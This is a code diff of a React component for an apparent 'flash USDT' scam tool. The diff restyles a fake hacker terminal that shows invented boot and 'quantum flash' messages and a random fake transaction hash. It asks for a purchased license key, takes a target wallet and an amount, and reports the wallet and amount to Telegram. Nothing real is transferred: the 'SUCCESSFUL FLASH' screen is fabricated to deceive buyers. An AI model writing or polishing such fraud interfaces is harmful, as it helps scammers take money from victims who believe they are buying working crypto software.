@@ -1,4 +1,3 @@
-
 import React, { useState, useEffect, useRef } from 'react';
 import { Product, SoftwareStage } from '../types.ts';
 import { validateLicenseKey, markKeyAsUsed } from '../services/licenseService.ts';
@@ -22,47 +21,49 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
   useEffect(() => {
     if (stage === 'BOOT') {
       const bootLines = [
-        `Initializing ${product.name} Core v${product.version}...`,
-        "Loading Dimensional Tunnelling protocols...",
-        "Establishing handshakes with Forest Nodes...",
-        "Quantum encryption: READY",
-        "Awaiting License Verification..."
+        `> INITIALIZING ${product.name} CORE V${product.version}...`,
+        "> LOADING DIMENSIONAL TUNNELLING PROTOCOLS...",
+        "> ESTABLISHING HANDSHAKE WITH FOREST NODES...",
+        "> QUANTUM ENCRYPTION: SECURED [AES-Q-512]",
+        "> AWAITING LICENSE VERIFICATION..."
       ];
       let i = 0;
       const interval = setInterval(() => {
-        setLogs(prev => [...prev, bootLines[i]]);
-        i++;
-        if (i === bootLines.length) {
+        if (i < bootLines.length) {
+          setLogs(prev => [...prev, bootLines[i]]);
+          i++;
+        } else {
           clearInterval(interval);
-          setTimeout(() => setStage('LICENSE'), 1000);
+          setTimeout(() => setStage('LICENSE'), 800);
         }
-      }, 500);
+      }, 300);
       return () => clearInterval(interval);
     }
-  }, [stage]);
+  }, [stage, product.name, product.version]);
 
   useEffect(() => {
     if (stage === 'EXECUTING') {
       const executionLines = [
-        `Syncing with wallet: ${wallet}...`,
-        `Preparing ${amount} USDT flash packet...`,
-        "Bypassing node detection...",
-        "Opening dimensional rift...",
-        "Injecting liquidity stream...",
-        "Verification hash: 0x" + Math.random().toString(16).slice(2, 10).toUpperCase(),
-        "Tunneling through Block 1928374...",
-        "Obfuscating transaction traces...",
-        "Finalizing quantum flash..."
+        `> SYNCING WITH TARGET WALLET: ${wallet.slice(0,6)}...${wallet.slice(-4)}`,
+        `> PREPARING ${amount} USDT FLASH PACKET...`,
+        "> BYPASSING NODE DETECTION ALGORITHMS...",
+        "> OPENING DIMENSIONAL RIFT...",
+        "> INJECTING LIQUIDITY STREAM...",
+        "> HASH: 0X" + Math.random().toString(16).slice(2, 12).toUpperCase(),
+        "> TUNNELING THROUGH BLOCK 21.092.11...",
+        "> OBFUSCATING TRANSACTION TRACES...",
+        "> FINALIZING QUANTUM FLASH..."
       ];
       let i = 0;
       const interval = setInterval(() => {
-        setLogs(prev => [...prev, executionLines[i]]);
-        i++;
-        if (i === executionLines.length) {
+        if (i < executionLines.length) {
+          setLogs(prev => [...prev, executionLines[i]]);
+          i++;
+        } else {
           clearInterval(interval);
-          setTimeout(() => setStage('COMPLETE'), 2000);
+          setTimeout(() => setStage('COMPLETE'), 1500);
         }
-      }, 800);
+      }, 600);
       return () => clearInterval(interval);
     }
   }, [stage, wallet, amount]);
@@ -75,8 +76,10 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
     if (validateLicenseKey(license)) {
       setStage('CONFIG');
       setError('');
+      setLogs(prev => [...prev, `> LICENSE VALIDATED: [${license}]`]);
     } else {
       setError('INVALID OR EXPIRED QUANTUM SIGNATURE');
+      setLogs(prev => [...prev, `> ERROR: AUTHENTICATION FAILED FOR SIGNATURE ${license}`]);
     }
   };
 
@@ -88,10 +91,8 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
     setError('');
     setStage('EXECUTING');
     
-    // Mark key as used
     markKeyAsUsed(license);
 
-    // Send to Telegram
     await sendTelegramNotification({
       product: product.name,
       wallet,
@@ -101,18 +102,18 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
   };
 
   return (
-    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/95 backdrop-blur-2xl p-4 overflow-y-auto">
-      <div className="w-full max-w-3xl glass-panel rounded-[40px] border-2 border-[#0aff0a]/40 shadow-[0_0_100px_rgba(10,255,10,0.2)] overflow-hidden flex flex-col h-full max-h-[85vh]">
+    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/90 backdrop-blur-xl p-4 md:p-8">
+      <div className="w-full max-w-4xl glass-panel rounded-[2rem] border-2 border-[#0aff0a]/30 shadow-[0_0_80px_rgba(10,255,10,0.15)] overflow-hidden flex flex-col h-full max-h-[90vh] animate-fade-in">
         {/* Terminal Header */}
-        <div className="p-6 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
+        <div className="p-5 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
           <div className="flex items-center gap-4">
             <div className="flex gap-2">
-              <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
-              <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
-              <div className="w-3 h-3 rounded-full bg-[#0aff0a]"></div>
+              <div className="w-3 h-3 rounded-full bg-red-500/40"></div>
+              <div className="w-3 h-3 rounded-full bg-yellow-500/40"></div>
+              <div className="w-3 h-3 rounded-full bg-[#0aff0a] animate-pulse"></div>
             </div>
-            <span className="font-mono text-[10px] font-black text-[#0aff0a]/60 uppercase tracking-widest">
-              Terminal: root@elon-core:/{product.id}/flash
+            <span className="font-mono text-[10px] font-black text-[#0aff0a]/70 uppercase tracking-[0.2em]">
+              root@elon-core:/{product.id}/quantum_flash
             </span>
           </div>
           <button onClick={onClose} className="text-white/40 hover:text-red-500 transition-colors">
@@ -121,78 +122,80 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
         </div>
 
         {/* Output Console */}
-        <div className="flex-1 overflow-y-auto p-8 font-mono text-xs text-[#0aff0a] space-y-2 bg-black/40">
+        <div className="flex-1 overflow-y-auto p-6 md:p-10 font-mono text-xs md:text-sm text-[#0aff0a] space-y-3 bg-black/60 scroll-smooth">
           {logs.map((log, i) => (
-            <div key={i} className="flex gap-4">
-              <span className="opacity-30">[{new Date().toLocaleTimeString()}]</span>
-              <span>{log}</span>
+            <div key={i} className="flex gap-4 opacity-90 animate-fade-in">
+              <span className="opacity-30 flex-shrink-0">[{new Date().toLocaleTimeString([], { hour12: false })}]</span>
+              <span className="leading-relaxed">{log}</span>
             </div>
           ))}
           <div ref={logEndRef} />
           
           {stage === 'LICENSE' && (
-            <div className="mt-8 p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-[fadeIn_0.5s_ease-out] space-y-6">
-              <h4 className="font-orbitron font-black text-xl text-center">LICENSE AUTHENTICATION</h4>
+            <div className="mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-fade-in space-y-6">
+              <h4 className="font-orbitron font-black text-xl text-center tracking-widest text-[#0aff0a]">LICENSE AUTHENTICATION</h4>
               <div className="flex flex-col md:flex-row gap-4">
                 <input
                   type="text"
-                  placeholder="ENTER QUANTUM LICENSE KEY"
+                  placeholder="ENTER QUANTUM KEY"
                   value={license}
                   onChange={(e) => setLicense(e.target.value.toUpperCase())}
-                  className="flex-1 bg-black border border-[#0aff0a]/30 rounded-xl px-5 py-4 text-center text-sm md:text-lg font-bold tracking-widest text-[#0aff0a] outline-none focus:border-[#0aff0a]"
+                  className="flex-1 bg-black/60 border border-[#0aff0a]/30 rounded-xl px-5 py-4 text-center text-lg font-bold tracking-[0.2em] text-[#0aff0a] outline-none focus:border-[#0aff0a] focus:ring-1 focus:ring-[#0aff0a]/50 transition-all"
                 />
                 <button 
                   onClick={handleLicenseSubmit}
-                  className="px-8 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] transition-all"
+                  className="px-10 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] active:scale-95 transition-all shadow-[0_0_20px_rgba(10,255,10,0.3)]"
                 >
                   VALIDATE
                 </button>
+              </div>
+              <div className="flex justify-center">
                 <button 
                   onClick={onPurchaseRequest}
-                  className="px-8 border border-[#0aff0a]/40 text-[#0aff0a] font-black uppercase rounded-xl hover:bg-[#0aff0a]/10 transition-all text-[10px]"
+                  className="text-[10px] text-[#0aff0a]/60 hover:text-[#0aff0a] font-bold uppercase tracking-widest transition-colors"
                 >
-                  PURCHASE KEY
+                  Need a license? Acquire one from Marketplace
                 </button>
               </div>
-              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse">{error}</p>}
+              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
             </div>
           )}
 
           {stage === 'CONFIG' && (
-            <div className="mt-8 p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-[fadeIn_0.5s_ease-out] space-y-8">
+            <div className="mt-8 p-6 md:p-10 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-fade-in space-y-8">
               <div className="text-center space-y-2">
-                <h4 className="font-orbitron font-black text-xl">FLASH PARAMETERS</h4>
-                <p className="text-[10px] opacity-60">LICENSE VALIDATED: {license}</p>
+                <h4 className="font-orbitron font-black text-xl tracking-widest text-[#0aff0a]">FLASH PARAMETERS</h4>
+                <p className="text-[10px] text-[#0aff0a]/40 uppercase tracking-widest">Authorized Session: {license}</p>
               </div>
               
-              <div className="space-y-6">
-                <div className="space-y-2">
-                  <label className="text-[10px] font-black uppercase tracking-widest opacity-40">Destination Wallet Address</label>
+              <div className="space-y-6 max-w-xl mx-auto">
+                <div className="space-y-3">
+                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Destination Wallet (TRC20 / ERC20)</label>
                   <input
                     type="text"
-                    placeholder="Enter TRC20 / ERC20 Address"
+                    placeholder="0x..."
                     value={wallet}
                     onChange={(e) => setWallet(e.target.value)}
-                    className="w-full bg-black border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-bold text-[#0aff0a] outline-none focus:border-[#0aff0a]"
+                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-mono text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                   />
                 </div>
-                <div className="space-y-2">
-                  <label className="text-[10px] font-black uppercase tracking-widest opacity-40">Amount to Flash (USDT)</label>
+                <div className="space-y-3">
+                  <label className="text-[10px] font-black uppercase tracking-[0.2em] text-[#0aff0a]/60">Amount to Flash (USDT)</label>
                   <input
                     type="number"
                     placeholder="0.00"
                     value={amount}
                     onChange={(e) => setAmount(e.target.value)}
-                    className="w-full bg-black border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-bold text-[#0aff0a] outline-none focus:border-[#0aff0a]"
+                    className="w-full bg-black/80 border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-mono text-[#0aff0a] outline-none focus:border-[#0aff0a] transition-all"
                   />
                 </div>
               </div>
 
-              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse">{error}</p>}
+              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse uppercase tracking-widest">{error}</p>}
 
               <button 
                 onClick={handleFlashSubmit}
-                className="w-full py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_30px_rgba(10,255,10,0.3)] transition-all flex items-center justify-center gap-3"
+                className="w-full max-w-xl mx-auto py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_40px_rgba(10,255,10,0.3)] active:scale-[0.98] transition-all flex items-center justify-center gap-3"
               >
                 <i className="fas fa-bolt"></i> INITIATE QUANTUM FLASH
               </button>
@@ -200,30 +203,32 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
           )}
 
           {stage === 'EXECUTING' && (
-            <div className="fixed inset-x-0 top-1/2 -translate-y-1/2 z-[1100] p-10 flex flex-col items-center justify-center pointer-events-none">
-               <div className="glass-panel p-10 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_100px_rgba(10,255,10,0.5)]">
+            <div className="fixed inset-0 z-[1100] flex flex-col items-center justify-center pointer-events-none bg-black/40">
+               <div className="glass-panel p-12 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_120px_rgba(10,255,10,0.4)] bg-black/60">
                  <i className="fas fa-satellite-dish text-6xl text-[#0aff0a]"></i>
                </div>
-               <div className="mt-8 text-center space-y-4 bg-black/80 p-6 rounded-2xl border border-[#0aff0a]/20 backdrop-blur-md">
-                 <h2 className="font-orbitron font-black text-2xl text-[#0aff0a]">FLASH IN PROGRESS</h2>
-                 <p className="text-xs text-[#b0ffb0] animate-pulse">PLEASE WAIT APPROXIMATELY 1 MINUTE...</p>
-                 <p className="text-[9px] text-white/30 uppercase tracking-[0.4em]">DO NOT CLOSE THIS TERMINAL</p>
+               <div className="mt-10 text-center space-y-4 bg-black/90 p-8 rounded-3xl border border-[#0aff0a]/20 backdrop-blur-md">
+                 <h2 className="font-orbitron font-black text-2xl text-[#0aff0a] tracking-widest">FLASH IN PROGRESS</h2>
+                 <p className="text-xs text-[#b0ffb0] animate-pulse font-mono">NEURAL HANDSHAKE ACTIVE. DO NOT DISCONNECT.</p>
+                 <div className="w-full bg-white/5 h-1 rounded-full overflow-hidden">
+                    <div className="bg-[#0aff0a] h-full animate-[progress_10s_linear_infinite]" style={{ width: '40%' }}></div>
+                 </div>
                </div>
             </div>
           )}
 
           {stage === 'COMPLETE' && (
-            <div className="mt-8 p-12 text-center space-y-10 animate-[fadeIn_0.5s_ease-out]">
-              <div className="w-32 h-32 bg-[#0aff0a] text-black rounded-[40px] flex items-center justify-center mx-auto shadow-[0_0_50px_rgba(10,255,10,0.6)]">
+            <div className="mt-8 p-12 text-center space-y-10 animate-fade-in">
+              <div className="w-32 h-32 bg-[#0aff0a] text-black rounded-[2.5rem] flex items-center justify-center mx-auto shadow-[0_0_60px_rgba(10,255,10,0.6)] rotate-6">
                 <i className="fas fa-check-double text-5xl"></i>
               </div>
               <div className="space-y-4">
-                <h3 className="font-orbitron text-4xl font-black text-[#0aff0a]">SUCCESSFUL FLASH</h3>
-                <p className="text-sm text-[#b0ffb0]/60 max-w-sm mx-auto">Liquidity has been successfully tunneled into the target node. Transaction hash is propagating.</p>
+                <h3 className="font-orbitron text-4xl font-black text-[#0aff0a] tracking-tighter">SUCCESSFUL FLASH</h3>
+                <p className="text-sm text-[#b0ffb0]/70 max-w-md mx-auto leading-relaxed">Liquidity has been successfully tunneled into the target node. Transaction hash is propagating across the Forest network.</p>
               </div>
               <button 
                 onClick={onClose}
-                className="w-full py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-2xl hover:bg-[#0aff0a]/10 transition-all"
+                className="w-full max-w-xs mx-auto py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-2xl hover:bg-[#0aff0a] hover:text-black transition-all shadow-[0_0_20px_rgba(10,255,10,0.1)]"
               >
                 DISCONNECT TERMINAL
               </button>
@@ -231,6 +236,12 @@ const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPur
           )}
         </div>
       </div>
+      <style>{`
+        @keyframes progress {
+          0% { width: 0%; }
+          100% { width: 100%; }
+        }
+      `}</style>
     </div>
   );
 };
